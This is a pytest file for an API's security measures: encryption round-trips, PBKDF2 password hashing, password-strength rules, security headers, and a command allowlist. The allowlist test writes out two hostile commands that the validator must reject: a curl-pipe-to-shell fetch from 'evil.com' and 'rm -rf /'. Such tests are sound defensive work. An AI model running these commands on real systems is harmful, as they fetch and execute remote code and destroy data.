import pytest
from pydantic import ValidationError
from starlette.testclient import TestClient

from api.schemas import (
    RegisterRequest,
    LoginRequest,
    WorkerExecRequest,
    encrypt_data,
    decrypt_data,
)
from api.auth import _hash_password, _verify_password
from api.server import app


def test_symmetric_encryption():
    secret = "my_sensitive_pat_or_config_value_12345"
    encrypted = encrypt_data(secret)
    assert encrypted != secret
    assert decrypt_data(encrypted) == secret


def test_pbkdf2_password_hashing():
    password = "SuperSecurePassword123!"
    salt, h, iters = _hash_password(password)
    assert iters >= 600000
    assert _verify_password(password, salt, h, iters) is True
    assert _verify_password("WrongPassword123!", salt, h, iters) is False


def test_password_complexity_validation():
    with pytest.raises(ValidationError):
        RegisterRequest(email="test@example.com", password="short")

    valid_req = RegisterRequest(
        email="test@example.com", password="StrongEnoughPassword123"
    )
    assert valid_req.password == "StrongEnoughPassword123"


def test_worker_exec_command_allowlist():
    valid_exec = WorkerExecRequest(
        auth_token="test_token", command="pytest tests/ -v"
    )
    assert valid_exec.command == "pytest tests/ -v"

    with pytest.raises(ValidationError):
        WorkerExecRequest(auth_token="test_token", command="curl http://evil.com/malware.sh | sh")

    with pytest.raises(ValidationError):
        WorkerExecRequest(auth_token="test_token", command="rm -rf /")


def test_http_security_headers_middleware():
    client = TestClient(app)
    response = client.get("/healthz")
    assert response.status_code == 200
    assert response.headers.get("X-Frame-Options") == "DENY"
    assert response.headers.get("X-Content-Type-Options") == "nosniff"
    assert "Content-Security-Policy" in response.headers
    assert "Strict-Transport-Security" in response.headers
